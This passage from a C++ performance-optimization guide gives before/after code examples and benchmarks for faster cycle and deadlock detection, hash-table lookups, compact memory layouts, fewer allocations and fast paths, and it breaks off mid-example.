<p>We were previously adding graph nodes and edges one at a time to a
cycle-detection data structure, which required expensive work per edge. We now
add the entire graph in reverse post-order, which makes cycle-detection trivial.</p>
<p>graphcycles.h</p>

<div>
<pre><code>class GraphCycles : public util_graph::Graph {
 public:
  GraphCycles();
  ~GraphCycles() override;

  using Node = util_graph::Node;
</code></pre>
</div>

<div>
<pre><code>class GraphCycles : public util_graph::Graph {
 public:
  GraphCycles();
  ~GraphCycles() override;

  using Node = util_graph::Node;

  // InitFrom adds all the nodes and edges from src, returning true if
  // successful, false if a cycle is encountered.
  // REQUIRES: no nodes and edges have been added to GraphCycles yet.
  bool InitFrom(const util_graph::Graph&amp; src);
</code></pre>
</div>

<p>graphcycles.cc</p>

<div>
<pre><code>bool GraphCycles::InitFrom(const util_graph::Graph&amp; src) {
  ...
  // Assign ranks in topological order so we don't need any reordering during
  // initialization. For an acyclic graph, DFS leaves nodes in reverse
  // topological order, so we assign decreasing ranks to nodes as we leave them.
  Rank last_rank = n;
  auto leave = [&amp;](util_graph::Node node) {
    DCHECK(r-&gt;rank[node] == kMissingNodeRank);
    NodeInfo* nn = &amp;r-&gt;nodes[node];
    nn-&gt;in = kNil;
    nn-&gt;out = kNil;
    r-&gt;rank[node] = --last_rank;
  };
  util_graph::DFSAll(src, std::nullopt, leave);

  // Add all the edges (detect cycles as we go).
  bool have_cycle = false;
  util_graph::PerEdge(src, [&amp;](util_graph::Edge e) {
    DCHECK_NE(r-&gt;rank[e.src], kMissingNodeRank);
    DCHECK_NE(r-&gt;rank[e.dst], kMissingNodeRank);
    if (r-&gt;rank[e.src] &gt;= r-&gt;rank[e.dst]) {
      have_cycle = true;
    } else if (!HasEdge(e.src, e.dst)) {
      EdgeListAddNode(r, &amp;r-&gt;nodes[e.src].out, e.dst);
      EdgeListAddNode(r, &amp;r-&gt;nodes[e.dst].in, e.src);
    }
  });
  if (have_cycle) {
    return false;
  } else {
    DCHECK(CheckInvariants());
    return true;
  }
}
</code></pre>
</div>

<p>graph_partitioner.cc</p>

<div>
<pre><code>absl::Status MergeGraph::Init() {
  const Graph&amp; graph = *compiler_-&gt;graph();
  clusters_.resize(graph.NodeLimit());
  graph.PerNode([&amp;](Node node) {
    graph_-&gt;AddNode(node);
    NodeList* n = new NodeList;
    n-&gt;push_back(node);
    clusters_[node] = n;
  });
  absl::Status s;
  PerEdge(graph, [&amp;](Edge e) {
    if (!s.ok()) return;
    if (graph_-&gt;HasEdge(e.src, e.dst)) return;  // already added
    if (!graph_-&gt;InsertEdge(e.src, e.dst)) {
      s = absl::InvalidArgumentError("cycle in the original graph");
    }
  });
  return s;
}
</code></pre>
</div>

<div>
<pre><code>absl::Status MergeGraph::Init() {
  const Graph&amp; graph = *compiler_-&gt;graph();
  if (!graph_-&gt;InitFrom(graph)) {
    return absl::InvalidArgumentError("cycle in the original graph");
  }
  clusters_.resize(graph.NodeLimit());
  graph.PerNode([&amp;](Node node) {
    NodeList* n = new NodeList;
    n-&gt;push_back(node);
    clusters_[node] = n;
  });
  return absl::OkStatus();
}
</code></pre>
</div>


</details>

<details>
<summary><p>Replace the deadlock detection system built into a mutex
implementation with a better algorithm.</p>
</summary>

<p>Replaced deadlock detection algorithm by one that is ~50x as fast and scales to
millions of mutexes without problem (the old algorithm relied on a 2K limit to
avoid a performance cliff). The new code is based on the following paper: A
dynamic topological sort algorithm for directed acyclic graphs David J. Pearce,
Paul H. J. Kelly Journal of Experimental Algorithmics (JEA) JEA Homepage archive
Volume 11, 2006, Article No. 1.7</p>
<p>The new algorithm takes O(|V|+|E|) space (instead of the O(|V|^2) bits needed by
the older algorithm). Lock-acquisition order graphs are very sparse, so this is
much less space. The algorithm is also quite simple: the core of it is ~100
lines of C++. Since the code now scales to much larger number of Mutexes, we
were able to relax an artificial 2K limit, which uncovered a number of latent
deadlocks in real programs.</p>
<p>Benchmark results: these were run in DEBUG mode since deadlock detection is
mainly enabled in debug mode. The benchmark argument (/2k etc.) is the number of
tracked nodes. At the default 2k limit of the old algorithm, the new algorithm
takes only 0.5 microseconds per InsertEdge compared to 22 microseconds for the
old algorithm. The new algorithm also easily scales to much larger graphs
without problems whereas the old algorithm keels over quickly.</p>
<pre><code>DEBUG: Benchmark            Time(ns)    CPU(ns) Iterations
----------------------------------------------------------
DEBUG: BM_StressTest/2k        23553      23566      29086
DEBUG: BM_StressTest/4k        45879      45909      15287
DEBUG: BM_StressTest/16k      776938     777472        817
</code></pre>
<pre><code>DEBUG: BM_StressTest/2k          392        393   10485760
DEBUG: BM_StressTest/4k          392        393   10485760
DEBUG: BM_StressTest/32k         407        407   10485760
DEBUG: BM_StressTest/256k        456        456   10485760
DEBUG: BM_StressTest/1M          534        534   10485760
</code></pre>

</details>

<details>
<summary><p>Replace an IntervalMap (with O(lg N) lookups) with a hash
table (O(1) lookups).</p>
</summary>

<p>The initial code was using IntervalMap because it seemed like the right data
structure to support coalescing of adjacent blocks, but a hash table suffices
since the adjacent block can be found by a hash table lookup. This (plus other
changes in the CL) improve the performance of tpu::BestFitAllocator by ~4X.</p>
<p>best_fit_allocator.h</p>

<div>
<pre><code>using Block = gtl::IntervalMap&lt;int64, BlockState&gt;::Entry;
...
// Map of pairs (address range, BlockState) with one entry for each allocation
// covering the range [0, allocatable_range_end_).  Adjacent kFree and
// kReserved blocks are coalesced. Adjacent kAllocated blocks are not
// coalesced.
gtl::IntervalMap&lt;int64, BlockState&gt; block_list_;

// Set of all free blocks sorted according to the allocation policy. Adjacent
// free blocks are coalesced.
std::set&lt;Block, BlockSelector&gt; free_list_;
</code></pre>
</div>

<div>
<pre><code>// A faster hash function for offsets in the BlockTable
struct OffsetHash {
  ABSL_ATTRIBUTE_ALWAYS_INLINE size_t operator()(int64 value) const {
    uint64 m = value;
    m *= uint64_t{0x9ddfea08eb382d69};
    return static_cast&lt;uint64_t&gt;(m ^ (m &gt;&gt; 32));
  }
};

// Hash table maps from block start address to block info.
// We include the length of the previous block in this info so we
// can find the preceding block to coalesce with.
struct HashTableEntry {
  BlockState state;
  int64 my_length;
  int64 prev_length;  // Zero if there is no previous block.
};
using BlockTable = absl::flat_hash_map&lt;int64, HashTableEntry, OffsetHash&gt;;
</code></pre>
</div>


</details>

<details>
<summary><p>Replace sorted-list intersection (O(N log N)) with hash
table lookups (O(N)).</p>
</summary>

<p>Old code to detect whether or not two nodes share a common source would get the
sources for each node in sorted order and then do a sorted intersection. The new
code places the sources for one node in a hash-table and then iterates over the
other node's sources checking the hash-table.</p>
<pre><code>name             old time/op  new time/op  delta
BM_CompileLarge   28.5s ± 2%   22.4s ± 2%  -21.61%  (p=0.008 n=5+5)
</code></pre>

</details>

<details>
<summary><p>Implement good hash function so that things are O(1)
instead of O(N).</p>
</summary>

<p>location.h</p>

<div>
<pre><code>// Hasher for Location objects.
struct LocationHash {
  size_t operator()(const Location* key) const {
    return key != nullptr ? util_hash::Hash(key-&gt;address()) : 0;
  }
};
</code></pre>
</div>

<div>
<pre><code>size_t HashLocation(const Location&amp; loc);
...
struct LocationHash {
  size_t operator()(const Location* key) const {
    return key != nullptr ? HashLocation(*key) : 0;
  }
};
</code></pre>
</div>

<p>location.cc</p>

<div>
<pre><code>size_t HashLocation(const Location&amp; loc) {
  util_hash::MurmurCat m;

  // Encode some simpler features into a single value.
  m.AppendAligned((loc.dynamic() ? 1 : 0)                    //
                  | (loc.append_shard_to_address() ? 2 : 0)  //
                  | (loc.is_any() ? 4 : 0)                   //
                  | (!loc.any_of().empty() ? 8 : 0)          //
                  | (loc.has_shardmap() ? 16 : 0)            //
                  | (loc.has_sharding() ? 32 : 0));

  if (loc.has_shardmap()) {
    m.AppendAligned(loc.shardmap().output() |
                    static_cast&lt;uint64_t&gt;(loc.shardmap().stmt()) &lt;&lt; 20);
  }
  if (loc.has_sharding()) {
    uint64_t num = 0;
    switch (loc.sharding().type_case()) {
      case Sharding::kModShard:
        num = loc.sharding().mod_shard();
        break;
      case Sharding::kRangeSplit:
        num = loc.sharding().range_split();
        break;
      case Sharding::kNumShards:
        num = loc.sharding().num_shards();
        break;
      default:
        num = 0;
        break;
    }
    m.AppendAligned(static_cast&lt;uint64_t&gt;(loc.sharding().type_case()) |
                    (num &lt;&lt; 3));
  }

  auto add_string = [&amp;m](absl::string_view s) {
    if (!s.empty()) {
      m.Append(s.data(), s.size());
    }
  };

  add_string(loc.address());
  add_string(loc.lb_policy());

  // We do not include any_of since it is complicated to compute a hash
  // value that is not sensitive to order and duplication.
  return m.GetHash();
}
</code></pre>
</div>


</details>

<h2 id="better-memory-representation">Better memory representation</h2>

<p>Careful consideration of memory footprint and cache footprint of important data
structures can often yield big savings. The data structures below focus on
supporting common operations by touching fewer cache lines. Care taken here can
(a) avoid expensive cache misses (b) reduce memory bus traffic, which speeds up
both the program in question and anything else running on the same machine. They
rely on some common techniques you may find useful when designing your own data
structures.</p>

<h3 id="compact-data-structures">Compact data structures</h3>

<p>Use compact representations for data that will be accessed often or that
comprises a large portion of the application’s memory usage. A compact
representation can significantly reduce memory usage and improve performance by
touching fewer cache lines and reducing memory bus bandwidth usage. However,
watch out for <a href="#reduce-false-sharing">cache-line contention</a>.</p>

<h3 id="memory-layout">Memory layout</h3>

<p>Carefully consider the memory layout of types that have a large memory or cache
footprint.</p>

<ul>
  <li>Reorder fields to reduce padding between fields with different alignment
requirements (see
<a href="https://stackoverflow.com/questions/9989164/optimizing-memory-layout-of-class-instances-in-c">class layout discussion</a>).</li>
  <li>Use smaller numeric types where the stored data will fit in the smaller
type.</li>
  <li>Enum values sometimes take up a whole word unless you’re careful. Consider
using a smaller representation (e.g., use <code>enum class OpType : uint8_t { ...
}</code> instead of <code>enum class OpType { ... }</code>).</li>
  <li>Order fields so that fields that are frequently accessed together are closer
to each other – this will reduce the number of cache lines touched on common
operations.</li>
  <li>Place hot read-only fields away from hot mutable fields so that writes to
the mutable fields do not cause the read-only fields to be evicted from
nearby caches.</li>
  <li>Move cold data so it does not live next to hot data, either by placing the
cold data at the end of the struct, or behind a level of indirection, or in
a separate array.</li>
  <li>Consider packing things into fewer bytes by using bit and byte-level
encoding. This can be complicated, so only do this when the data under
question is encapsulated inside a well-tested module, and the overall
reduction of memory usage is significant. Furthermore, watch out for side
effects like under-alignment of frequently used data, or more expensive code
for accessing packed representations. Validate such changes using
benchmarks.</li>
</ul>

<h3 id="indices-instead-of-pointers">Indices instead of pointers</h3>

<p>On modern 64-bit machines, pointers take up 64 bits. If you have a pointer-rich
data structure, you can easily chew up lots of memory with indirections of T*.
Instead, consider using integer indices into an array T[] or other data
structure. Not only will the references be smaller (if the number of indices is
small enough to fit in 32 or fewer bits), but the storage for all the T[]
elements will be contiguous, often leading to better cache locality.</p>

<h3 id="batched-storage">Batched storage</h3>

<p>Avoid data structures that allocate a separate object per stored element (e.g.,
<code>std::map</code>, <code>std::unordered_map</code> in C++). Instead, consider types that use
chunked or flat representations to store multiple elements in close proximity in
memory (e.g., <code>std::vector</code>, <code>absl::flat_hash_{map,set}</code> in C++). Such types
tend to have much better cache behavior. Furthermore, they encounter less
allocator overhead.</p>

<p>One useful technique is to partition elements into chunks where each chunk can
hold a fixed number of elements. This technique can reduce the cache footprint
of a data structure significantly while preserving good asymptotic behavior.</p>

<p>For some data structures, a single chunk suffices to hold all elements (e.g.,
strings and vectors). Other types (e.g., <code>absl::flat_hash_map</code>) also use this
technique.</p>

<h3 id="inlined-storage">Inlined storage</h3>

<p>Some container types are optimized for storing a small number of elements. These
types provide space for a small number of elements at the top level and
completely avoid allocations when the number of elements is small. This can be
very helpful when instances of such types are constructed often (e.g., as stack
variables in frequently executed code), or if many instances are live at the
same time. If a container will typically contain a small number of elements
consider using one of the inlined storage types, e.g., InlinedVector.</p>

<p>Caveat: if <code>sizeof(T)</code> is large, inlined storage containers may not be the best
choice since the inlined backing store will be large.</p>

<h3 id="unnecessarily-nested-maps">Unnecessarily nested maps</h3>

<p>Sometimes a nested map data structure can be replaced with a single-level map
with a compound key. This can reduce the cost of lookups and insertions
significantly.</p>

<details>
<summary><p>Reduce allocations and improve cache footprint by
converting btree&lt;a,btree&lt;b,c&gt;&gt; to btree&lt;pair&lt;a,b&gt;,c&gt;.</p>
</summary>

<p>graph_splitter.cc</p>

<div>
<pre><code>absl::btree_map&lt;std::string, absl::btree_map&lt;std::string, OpDef&gt;&gt; ops;
</code></pre>
</div>

<div>
<pre><code>// The btree maps from {package_name, op_name} to its const Opdef*.
absl::btree_map&lt;std::pair&lt;absl::string_view, absl::string_view&gt;,
                const OpDef*&gt;
    ops;
</code></pre>
</div>


</details>

<p>Caveat: if the first map key is big, it might be better to stick with nested
maps:</p>

<details>
<summary><p>Switch to a nested map leads to 76% performance
improvement in microbenchmark.</p>
</summary>

<p>We previously had a single-level hash table where the key consisted of a
(string) path and some other numeric sub-keys. Each path occurred in
approximately 1000 keys on average. We split the hash table into two levels
where the first level was keyed by the path and each second level hash table
kept just the sub-key to data mapping for a particular path. This reduced the
memory usage for storing paths by a factor of 1000, and also sped up accesses
where many sub-keys for the same path were accessed together.</p>

</details>

<h3 id="arenas">Arenas</h3>

<p>Arenas can help reduce memory allocation cost, but they also have the benefit of
packing together independently allocated items next to each other, typically in
fewer cache lines, and eliminating most destruction costs. They are likely most
effective for complex data structures with many sub-objects. Consider providing
an appropriate initial size for the arena since that can help reduce
allocations.</p>

<p>Caveat: it is easy to misuse arenas by putting too many short-lived objects in a
long-lived arena, which can unnecessarily bloat memory footprint.</p>

<h3 id="arrays-instead-of-maps">Arrays instead of maps</h3>

<p>If the domain of a map can be represented by a small integer or is an enum, or
if the map will have very few elements, the map can sometimes be replaced by an
array or a vector of some form.</p>

<details>
<summary><p>Use an array instead of flat_map.</p>
</summary>

<p>rtp_controller.h</p>

<div>
<pre><code>const gtl::flat_map&lt;int, int&gt; payload_type_to_clock_frequency_;
</code></pre>
</div>

<div>
<pre><code>// A map (implemented as a simple array) indexed by payload_type to clock freq
// for that paylaod type (or 0)
struct PayloadTypeToClockRateMap {
  int map[128];
};
...
const PayloadTypeToClockRateMap payload_type_to_clock_frequency_;
</code></pre>
</div>


</details>

<h3 id="bit-vectors-instead-of-sets">Bit vectors instead of sets</h3>

<p>If the domain of a set can be represented by a small integer, the set can be
replaced with a bit vector (InlinedBitVector is often a good choice). Set
operations can also be nicely efficient on these representations using bitwise
boolean operations (OR for union, AND for intersection, etc.).</p>

<details>
<summary><p>Spanner placement system. Replace
dense_hash_set&lt;ZoneId&gt; with a bit-vector with one bit per zone.</p>
</summary>

<p>zone_set.h</p>

<div>
<pre><code>class ZoneSet: public dense_hash_set&lt;ZoneId&gt; {
 public:
  ...
  bool Contains(ZoneId zone) const {
    return count(zone) &gt; 0;
  }
</code></pre>
</div>

<div>
<pre><code>class ZoneSet {
  ...
  // Returns true iff "zone" is contained in the set
  bool ContainsZone(ZoneId zone) const {
    return zone &lt; b_.size() &amp;&amp; b_.get_bit(zone);
  }
  ...
 private:
  int size_;          // Number of zones inserted
  util::bitmap::InlinedBitVector&lt;256&gt; b_;
</code></pre>
</div>

<p>Benchmark results:</p>
<pre><code>CPU: AMD Opteron (4 cores) dL1:64KB dL2:1024KB
Benchmark                          Base (ns)  New (ns) Improvement
------------------------------------------------------------------
BM_Evaluate/1                            960       676    +29.6%
BM_Evaluate/2                           1661      1138    +31.5%
BM_Evaluate/3                           2305      1640    +28.9%
BM_Evaluate/4                           3053      2135    +30.1%
BM_Evaluate/5                           3780      2665    +29.5%
BM_Evaluate/10                          7819      5739    +26.6%
BM_Evaluate/20                         17922     12338    +31.2%
BM_Evaluate/40                         36836     26430    +28.2%
</code></pre>

</details>

<details>
<summary><p>Use bit matrix to keep track of reachability properties
between operands instead of hash table.</p>
</summary>

<p>hlo_computation.h</p>

<div>
<pre><code>using TransitiveOperandMap =
    std::unordered_map&lt;const HloInstruction*,
                       std::unordered_set&lt;const HloInstruction*&gt;&gt;;
</code></pre>
</div>

<div>
<pre><code>class HloComputation::ReachabilityMap {
  ...
  // dense id assignment from HloInstruction* to number
  tensorflow::gtl::FlatMap&lt;const HloInstruction*, int&gt; ids_;
  // matrix_(a,b) is true iff b is reachable from a
  tensorflow::core::Bitmap matrix_;
};
</code></pre>
</div>


</details>

<h2 id="reduce-allocations">Reduce allocations</h2>

<p>Memory allocation adds costs:</p>

<ol>
  <li>It increases the time spent in the allocator.</li>
  <li>Newly-allocated objects may require expensive initialization and sometimes
corresponding expensive destruction when no longer needed.</li>
  <li>Every allocation tends to be on a new cache line and therefore data spread
across many independent allocations will have a larger cache footprint than
data spread across fewer allocations.</li>
</ol>

<p>Garbage-collection runtimes sometimes obviate issue #3 by placing consecutive
allocations sequentially in memory.</p>

<h3 id="avoid-unnecessary-allocations">Avoid unnecessary allocations</h3>

<details>
<summary><p>Reducing allocations increases benchmark throughput by
21%.</p>
</summary>

<p>memory_manager.cc</p>

<div>
<pre><code>LiveTensor::LiveTensor(tf::Tensor t, std::shared_ptr&lt;const DeviceInfo&gt; dinfo,
                       bool is_batched)
    : tensor(std::move(t)),
      device_info(dinfo ? std::move(dinfo) : std::make_shared&lt;DeviceInfo&gt;()),
      is_batched(is_batched) {
</code></pre>
</div>

<div>
<pre><code>static const std::shared_ptr&lt;DeviceInfo&gt;&amp; empty_device_info() {
  static std::shared_ptr&lt;DeviceInfo&gt;* result =
      new std::shared_ptr&lt;DeviceInfo&gt;(new DeviceInfo);
  return *result;
}

LiveTensor::LiveTensor(tf::Tensor t, std::shared_ptr&lt;const DeviceInfo&gt; dinfo,
                       bool is_batched)
    : tensor(std::move(t)), is_batched(is_batched) {
  if (dinfo) {
    device_info = std::move(dinfo);
  } else {
    device_info = empty_device_info();
  }
</code></pre>
</div>


</details>

<details>
<summary><p>Use statically-allocated zero vector when possible rather
than allocating a vector and filling it with zeroes.</p>
</summary>

<p>embedding_executor_8bit.cc</p>
<pre><code>// The actual implementation of the EmbeddingLookUpT using template parameters
// instead of object members to improve the performance.
template &lt;bool Mean, bool SymmetricInputRange&gt;
static tensorflow::Status EmbeddingLookUpT(...) {
    ...
  std::unique_ptr&lt;tensorflow::quint8[]&gt; zero_data(
      new tensorflow::quint8[max_embedding_width]);
  memset(zero_data.get(), 0, sizeof(tensorflow::quint8) * max_embedding_width);
</code></pre>
<pre><code>// A size large enough to handle most embedding widths
static const int kTypicalMaxEmbedding = 256;
static tensorflow::quint8 static_zero_data[kTypicalMaxEmbedding];  // All zeroes
...
// The actual implementation of the EmbeddingLookUpT using template parameters
// instead of object members to improve the performance.
template &lt;bool Mean, bool SymmetricInputRange&gt;
static tensorflow::Status EmbeddingLookUpT(...) {
    ...
  std::unique_ptr&lt;tensorflow::quint8[]&gt; zero_data_backing(nullptr);

  // Get a pointer to a memory area with at least
  // "max_embedding_width" quint8 zero values.
  tensorflow::quint8* zero_data;
  if (max_embedding_width &lt;= ARRAYSIZE(static_zero_data)) {
    // static_zero_data is big enough so we don't need to allocate zero data
    zero_data = &amp;static_zero_data[0];
  } else {
    // static_zero_data is not big enough: we need to allocate zero data
    zero_data_backing =
        absl::make_unique&lt;tensorflow::quint8[]&gt;(max_embedding_width);
    memset(zero_data_backing.get(), 0,
           sizeof(tensorflow::quint8) * max_embedding_width);
    zero_data = zero_data_backing.get();
  }
</code></pre>

</details>

<p>Also, prefer stack allocation over heap allocation when object lifetime is
bounded by the scope (although be careful with stack frame sizes for large
objects).</p>

<h3 id="resize-or-reserve-containers">Resize or reserve containers</h3>

<p>When the maximum or expected maximum size of a vector (or some other container
types) is known in advance, pre-size the container’s backing store (e.g., using
<code>resize</code> or <code>reserve</code> in C++).</p>

<details>
<summary><p>Pre-size a vector and fill it in, rather than N push_back
operations.</p>
</summary>

<p>indexblockdecoder.cc</p>

<div>
<pre><code>for (int i = 0; i &lt; ndocs-1; i++) {
  uint32 delta;
  ERRORCHECK(b-&gt;GetRice(rice_base, &amp;delta));
  docs_.push_back(DocId(my_shard_ + (base + delta) * num_shards_));
  base = base + delta + 1;
}
docs_.push_back(last_docid_);
</code></pre>
</div>

<div>
<pre><code>docs_.resize(ndocs);
DocId* docptr = &amp;docs_[0];
for (int i = 0; i &lt; ndocs-1; i++) {
  uint32 delta;
  ERRORCHECK(b.GetRice(rice_base, &amp;delta));
  *docptr = DocId(my_shard_ + (base + delta) * num_shards_);
  docptr++;
  base = base + delta + 1;
}
*docptr = last_docid_;
</code></pre>
</div>


</details>

<p>Caveat: Do not use <code>resize</code> or <code>reserve</code> to grow one element at a time since
that may lead to quadratic behavior. Also, if element construction is expensive,
prefer an initial <code>reserve</code> call followed by several <code>push_back</code> or
<code>emplace_back</code> calls instead of an initial <code>resize</code> since that will double the
number of constructor calls.</p>

<h3 id="avoid-copying-when-possible">Avoid copying when possible</h3>

<ul>
  <li>Prefer moving to copying data structures when possible.</li>
  <li>If lifetime is not an issue, store pointers or indices instead of copies of
objects in transient data structures. E.g., if a local map is used to select
a set of protos from an incoming list of protos, we can make the map store
just pointers to the incoming protos instead of copying potentially deeply
nested data. Another common example is sorting a vector of indices rather
than sorting a vector of large objects directly since the latter would incur
significant copying/moving costs.</li>
</ul>

<details>
<summary><p>Avoid an extra copy when receiving a tensor via gRPC.</p>
</summary>

<p>A benchmark that sends around 400KB tensors speeds up by ~10-15%:</p>
<pre><code>Benchmark              Time(ns)    CPU(ns) Iterations
-----------------------------------------------------
BM_RPC/30/98k_mean    148764691 1369998944       1000
</code></pre>
<pre><code>Benchmark              Time(ns)    CPU(ns) Iterations
-----------------------------------------------------
BM_RPC/30/98k_mean    131595940 1216998084       1000
</code></pre>

</details>

<details>
<summary><p>Move large options structure rather than copying it.</p>
</summary>

<p>index.cc</p>

<div>
<pre><code>return search_iterators::DocPLIteratorFactory::Create(opts);
</code></pre>
</div>

<div>
<pre><code>return search_iterators::DocPLIteratorFactory::Create(std::move(opts));
</code></pre>
</div>


</details>

<details>
<summary><p>Use std::sort instead of std::stable_sort, which avoids
an internal copy inside the stable sort implementation.</p>
</summary>

<p>encoded-vector-hits.h</p>

<div>
<pre><code>std::stable_sort(hits_.begin(), hits_.end(),
                 gtl::OrderByField(&amp;HitWithPayloadOffset::docid));
</code></pre>
</div>

<div>
<pre><code>struct HitWithPayloadOffset {
  search_iterators::LocalDocId64 docid;
  int first_payload_offset;  // offset into the payload vector.
  int num_payloads;

  bool operator&lt;(const HitWithPayloadOffset&amp; other) const {
    return (docid &lt; other.docid) ||
           (docid == other.docid &amp;&amp;
            first_payload_offset &lt; other.first_payload_offset);
  }
};
    ...
    std::sort(hits_.begin(), hits_.end());
</code></pre>
</div>


</details>

<h3 id="reuse-temporary-objects">Reuse temporary objects</h3>

<p>A container or an object declared inside a loop will be recreated on every loop
iteration. This can lead to expensive construction, destruction, and resizing.
Hoisting the declaration outside the loop enables reuse and can provide a
significant performance boost. (Compilers are often unable to do such hoisting
on their own due to language semantics or their inability to ensure program
equivalence.)</p>

<details>
<summary><p>Hoist variable definition outside of loop iteration.</p>
</summary>

<p>autofdo_profile_utils.h</p>

<div>
<pre><code>auto iterator = absl::WrapUnique(sstable-&gt;GetIterator());
while (!iterator-&gt;done()) {
  T profile;
  if (!profile.ParseFromString(iterator-&gt;value_view())) {
    return absl::InternalError(
        "Failed to parse mem_block to specified profile type.");
  }
  ...
  iterator-&gt;Next();
}
</code></pre>
</div>

<div>
<pre><code>auto iterator = absl::WrapUnique(sstable-&gt;GetIterator());
T profile;
while (!iterator-&gt;done()) {
  if (!profile.ParseFromString(iterator-&gt;value_view())) {
    return absl::InternalError(
        "Failed to parse mem_block to specified profile type.");
  }
  ...
  iterator-&gt;Next();
}
</code></pre>
</div>


</details>

<details>
<summary><p>Define a protobuf variable outside a loop so that its
allocated storage can be reused across loop iterations.</p>
</summary>

<p>stats-router.cc</p>

<div>
<pre><code>for (auto&amp; r : routers_to_update) {
  ...
  ResourceRecord record;
  {
    MutexLock agg_lock(r.agg-&gt;mutex());
    r.agg-&gt;AddResourceRecordUsages(measure_indices, &amp;record);
  }
  ...
}
</code></pre>
</div>

<div>
<pre><code>ResourceRecord record;
for (auto&amp; r : routers_to_update) {
  ...
  record.Clear();
  {
    MutexLock agg_lock(r.agg-&gt;mutex());
    r.agg-&gt;AddResourceRecordUsages(measure_indices, &amp;record);
  }
  ...
}
</code></pre>
</div>


</details>

<details>
<summary><p>Serialize to same std::string repeatedly.</p>
</summary>

<p>program_rep.cc</p>

<div>
<pre><code>std::string DeterministicSerialization(const proto2::Message&amp; m) {
  std::string result;
  proto2::io::StringOutputStream sink(&amp;result);
  proto2::io::CodedOutputStream out(&amp;sink);
  out.SetSerializationDeterministic(true);
  m.SerializePartialToCodedStream(&amp;out);
  return result;
}
</code></pre>
</div>

<div>
<pre><code>absl::string_view DeterministicSerializationTo(const proto2::Message&amp; m,
                                               std::string* scratch) {
  scratch-&gt;clear();
  proto2::io::StringOutputStream sink(scratch);
  proto2::io::CodedOutputStream out(&amp;sink);
  out.SetSerializationDeterministic(true);
  m.SerializePartialToCodedStream(&amp;out);
  return absl::string_view(*scratch);
}
</code></pre>
</div>


</details>

<p>Caveat: protobuf, string, vector, containers etc. tend to grow to the size of
the largest value ever stored in them. Therefore reconstructing them
periodically (e.g., after every N uses) can help reduce memory requirements and
reinitialization costs.</p>

<h2 id="avoid-unnecessary-work">Avoid unnecessary work</h2>

<p>Perhaps one of the most effective categories of improving performance is
avoiding work you don’t have to do. This can take many forms, including creating
specialized paths through code for common cases that avoid more general
expensive computation, precomputation, deferring work until it is really needed,
hoisting work into less-frequently executed pieces of code, and other similar
approaches. Below are many examples of this general approach, categorized into a
few representative categories.</p>

<h3 id="fast-paths-for-common-cases">Fast paths for common cases</h3>

<p>Often, code is written to cover all cases, but some subset of the cases are much
simpler and more common than others. E.g., <code>vector::push_back</code> usually has
enough space for the new element, but contains code to resize the underlying
storage when it does not. Some attention paid to the structure of code can help
make the common simple case faster without hurting uncommon case performance
significantly.</p>

<details>
<summary><p>Make fast path cover more common cases.</p>
</summary>

<p>Add handling of trailing single ASCII bytes, rather than only handling multiples
of four bytes with this routine. This avoids calling the slower generic routine
for all-ASCII strings that are, for example, 5 bytes.</p>
<p>utf8statetable.cc</p>

<div>
<pre><code>// Scan a UTF-8 stringpiece based on state table.
// Always scan complete UTF-8 characters
// Set number of bytes scanned. Return reason for exiting
// OPTIMIZED for case of 7-bit ASCII 0000..007f all valid
int UTF8GenericScanFastAscii(const UTF8ScanObj* st, absl::string_view str,
                             int* bytes_consumed) {
                             ...
  int exit_reason;
  do {
    //  Skip 8 bytes of ASCII at a whack; no endianness issue
    while ((src_limit - src &gt;= 8) &amp;&amp;
           (((UNALIGNED_LOAD32(src + 0) | UNALIGNED_LOAD32(src + 4)) &amp;
             0x80808080) == 0)) {
      src += 8;
    }
    //  Run state table on the rest
    int rest_consumed;
    exit_reason = UTF8GenericScan(
        st, absl::ClippedSubstr(str, src - initial_src), &amp;rest_consumed);
    src += rest_consumed;
  } while (exit_reason == kExitDoAgain);

  *bytes_consumed = src - initial_src;
  return exit_reason;
}
</code></pre>
</div>

<div>
<pre><code>// Scan a UTF-8 stringpiece based on state table.
// Always scan complete UTF-8 characters
// Set number of bytes scanned. Return reason for exiting
// OPTIMIZED for case of 7-bit ASCII 0000..007f all valid
int UTF8GenericScanFastAscii(const UTF8ScanObj* st, absl::string_view str,
                             int* bytes_consumed) {
                             ...
  int exit_reason = kExitOK;
  do {
    //  Skip 8 bytes of ASCII at a whack; no endianness issue
    while ((src_limit - src &gt;= 8) &amp;&amp;
           (((UNALIGNED_LOAD32(src + 0) | UNALIGNED_LOAD32(src + 4)) &amp;
             0x80808080) == 0)) {
      src += 8;
    }
    while (src &lt; src_limit &amp;&amp; Is7BitAscii(*src)) { // Skip ASCII bytes
      src++;
    }
    if (src &lt; src_limit) {
      //  Run state table on the rest
      int rest_consumed;
      exit_reason = UTF8GenericScan(
          st, absl::ClippedSubstr(str, src - initial_src), &amp;rest_consumed);
      src += rest_consumed;
    }
  } while (exit_reason == kExitDoAgain);

  *bytes_consumed = src - initial_src;
  return exit_reason;
}
</code></pre>
</div>


</details>

<details>
<summary><p>Simpler fast paths for InlinedVector.</p>
</summary>

<p>inlined_vector.h</p>

<div>
<pre><code>auto Storage&lt;T, N, A&gt;::Resize(ValueAdapter values, size_type new_size) -&gt; void {
  StorageView storage_view = MakeStorageView();

  IteratorValueAdapter&lt;MoveIterator&gt; move_values(
      MoveIterator(storage_view.data));

  AllocationTransaction allocation_tx(GetAllocPtr());
  ConstructionTransaction construction_tx(GetAllocPtr());

  absl::Span&lt;value_type&gt; construct_loop;
  absl::Span&lt;value_type&gt; move_construct_loop;
  absl::Span&lt;value_type&gt; destroy_loop;

  if (new_size &gt; storage_view.capacity) {
  ...
  } else if (new_size &gt; storage_view.size) {
    construct_loop = {storage_view.data + storage_view.size,
                      new_size - storage_view.size};
  } else {
    destroy_loop = {storage_view.data + new_size, storage_view.size - new_size};
  }
</code></pre>
</div>

<div>
<pre><code>auto Storage&lt;T, N, A&gt;::Resize(ValueAdapter values, size_type new_size) -&gt; void {
  StorageView storage_view = MakeStorageView();
  auto* const base = storage_view.data;
  const size_type size = storage_view.size;
  auto* alloc = GetAllocPtr();
  if (new_size &lt;= size) {
    // Destroy extra old elements.
    inlined_vector_internal::DestroyElements(alloc, base + new_size,
                                             size - new_size);
  } else if (new_size &lt;= storage_view.capacity) {
    // Construct new elements in place.
    inlined_vector_internal::ConstructElements(alloc, base + size, &amp;values,
                                               new_size - size);
  } else {
  ...
  }
</code></pre>
</div>


</details>

<details>
<summary><p>Fast path for common cases of initializing 1-D to 4-D
tensors.</p>
</summary>

<p>tensor_shape.cc</p>

<div>
<pre><code>template &lt;class Shape&gt;
